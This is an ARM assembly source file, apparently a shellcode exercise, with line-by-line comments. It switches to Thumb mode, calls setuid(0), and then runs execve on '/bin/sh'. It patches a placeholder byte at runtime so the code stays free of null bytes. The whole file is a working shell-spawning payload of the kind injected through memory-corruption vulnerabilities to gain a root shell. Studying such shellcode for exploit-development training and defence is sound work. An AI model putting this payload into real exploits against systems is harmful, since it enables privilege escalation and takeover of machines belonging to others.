.text
.global _start

_start:
    .code 32
    add r3, pc, #1      @ Add 1 to PC register and add it to r3
    bx r3               @ Branch and exchange to switch to Thumb mode (LSB = 1)

    .code 16
    @@@ setuid(0); @@@
    eor r2, r2, r2      @ XOR r2 with itself, zeroing it out
    mov r0, r2          @ Move r2 (0) into r0
    mov r7, #23         @ Store syscall for setuid (23) in r7
    svc #1              @ Interrupt to make a supervisor call
    @@@ execve("/bin/sh", ["/bin/sh"], NULL); @@@
    adr r0, shell       @ Use program-relative addressing to load our string into r0
    eor r2, r2, r2      @ XOR r2 with itself, zeroing it out
    strb r2, [r0, #7]   @ Overwrite the last byte (X) in r0 to be NULL
    push {r0, r2}       @ Push r0 ("/bin/sh\0") and r2 (NULL) onto the stack
    mov r1, sp          @ Store address of sp (top of stack) into r1
    mov r7, #11         @ Store syscall for execve (11) in r7
    svc #1              @ Interrupt to make a supervisor call
    mov r5, r5          @ NOP instruction for proper alignment

shell:
    .ascii "/bin/shX"

